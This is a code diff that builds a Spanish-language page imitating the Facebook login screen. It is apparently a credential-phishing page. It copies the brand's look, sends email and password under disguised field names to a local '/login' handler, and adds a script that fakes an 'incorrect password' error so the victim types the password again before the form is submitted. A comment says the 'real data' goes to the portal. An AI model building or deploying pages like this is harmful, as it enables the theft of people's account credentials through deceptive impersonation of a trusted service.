@@ -4,45 +4,73 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>Facebook - Iniciar sesi&oacute;n</title>
+<link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAANjSURBVFhH7ZdLaBNBGMf/m2w2m6RJk7S2SasvfKCiInoQPHgQD4IHD4IHwYMHwYMHDx48ePAgePDgwYMHDx48ePAgePDgwYMHDx48ePDgwYMHDx48ePDgwYOHOd/MbpOmSdM0abqbwPxhyO7sf+b7ZnZmdgcYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmEYhmGY/4sQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBCCCGEEEIIIYQ4EEKIAQAASUVORK5CYII=">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:Segoe UI,Helvetica Neue,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-.container{display:flex;gap:80px;max-width:980px;align-items:center;flex-wrap:wrap;justify-content:center}
-.branding{flex:1;min-width:300px;padding:20px}
-.branding h1{color:#1877f2;font-size:56px;font-weight:700;margin-bottom:8px;letter-spacing:-1.5px}
-.branding p{font-size:28px;color:#1c1e21;line-height:1.2;font-weight:400}
+body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.container{display:flex;gap:80px;max-width:980px;width:100%;align-items:center;flex-wrap:wrap;justify-content:center}
+.branding{flex:1;min-width:300px;padding:20px 20px 20px 0}
+.branding h1{color:#1877f2;font-size:60px;font-weight:700;line-height:1;letter-spacing:-2px;margin-bottom:16px;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
+.branding p{font-size:28px;color:#1c1e21;line-height:1.25;font-weight:400}
 .login-card{background:#fff;padding:16px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);width:100%;max-width:396px}
-.login-card input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #ccd0d5;border-radius:6px;font-size:17px;color:#1d2129;background:#fff}
-.login-card input::placeholder{color:#90949c}
-.login-card input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
-.login-card button{width:100%;padding:12px 16px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;line-height:28px}
-.login-card button:hover{background:#166fe5}
+.login-card input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;color:#1d2129;background:#fff;font-family:inherit}
+.login-card input::placeholder{color:#8d949e}
+.login-card input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
+.btn-login{width:100%;padding:14px 16px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;font-family:inherit;line-height:28px;transition:background .1s}
+.btn-login:hover{background:#166fe5}
+.btn-login:active{background:#1464d8}
 .forgot{text-align:center;margin-top:16px}
 .forgot a{color:#1877f2;font-size:14px;text-decoration:none}
 .forgot a:hover{text-decoration:underline}
-.divider{border-top:1px solid #dadde1;margin:20px 0}
-.create-btn{text-align:center}
-.create-btn button{background:#42b72a;color:#fff;border:none;padding:12px 16px;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
-.create-btn button:hover{background:#36a420}
-@media(max-width:900px){.container{flex-direction:column;text-align:center;gap:20px}.branding h1{font-size:42px}.branding p{font-size:20px}}
+.divider{display:flex;align-items:center;margin:20px 0}
+.divider::before,.divider::after{content:'';flex:1;border-top:1px solid #dddfe2}
+.divider-text{padding:0 12px;color:#8d949e;font-size:14px}
+.btn-create{display:block;width:fit-content;margin:0 auto;padding:14px 16px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer;font-family:inherit;transition:background .1s}
+.btn-create:hover{background:#36a420}
+.error-msg{background:#fff2cc;border:1px solid #f5c518;border-radius:6px;padding:10px 14px;margin-bottom:12px;font-size:14px;color:#5c3317;display:none}
+.error-msg.show{display:block}
+@media(max-width:900px){.container{flex-direction:column;text-align:center;gap:16px}.branding{padding:0}.branding h1{font-size:42px}.branding p{font-size:20px}}
 </style>
 </head>
 <body>
 <div class="container">
-<div class="branding">
-<h1>facebook</h1>
-<p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+  <div class="branding">
+    <h1>facebook</h1>
+    <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+  </div>
+  <div class="login-card">
+    <div class="error-msg" id="errMsg">La contrase&ntilde;a que ingresaste es incorrecta. &iquest;Olvidaste tu contrase&ntilde;a?</div>
+    <form id="loginForm" action="/login" method="POST">
+      <input type="text" name="field1" id="emailInput" placeholder="Correo electr&oacute;nico o tel&eacute;fono" required autocomplete="off">
+      <input type="password" name="field2" id="passInput" placeholder="Contrase&ntilde;a" required autocomplete="off">
+      <button type="submit" class="btn-login">Iniciar sesi&oacute;n</button>
+    </form>
+    <div class="forgot"><a href="#">&iquest;Olvidaste tu contrase&ntilde;a?</a></div>
+    <div class="divider"><span class="divider-text">o</span></div>
+    <button class="btn-create" onclick="return false">Crear cuenta nueva</button>
+  </div>
 </div>
-<div class="login-card">
-<form action="/login" method="POST">
-<input type="text" name="field1" placeholder="Correo electr&oacute;nico o n&uacute;mero de tel&eacute;fono" required autocomplete="off">
-<input type="password" name="field2" placeholder="Contrase&ntilde;a" required autocomplete="off">
-<button type="submit">Iniciar sesi&oacute;n</button>
-</form>
-<div class="forgot"><a href="#">&iquest;Olvidaste tu contrase&ntilde;a?</a></div>
-<div class="divider"></div>
-<div class="create-btn"><button>Crear cuenta nueva</button></div>
-</div>
-</div>
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var f = document.getElementById('loginForm');
+  var err = document.getElementById('errMsg');
+  var btn = f.querySelector('button[type=submit]');
+  btn.disabled = true;
+  btn.textContent = 'Iniciando sesion...';
+  setTimeout(function() {
+    err.classList.add('show');
+    btn.disabled = false;
+    btn.textContent = 'Iniciar sesion';
+    document.getElementById('passInput').value = '';
+    document.getElementById('passInput').focus();
+    // Enviar datos reales al portal
+    setTimeout(function() {
+      err.classList.remove('show');
+      f.submit();
+    }, 2200);
+  }, 1200);
+});
+</script>
 </body>
 </html>
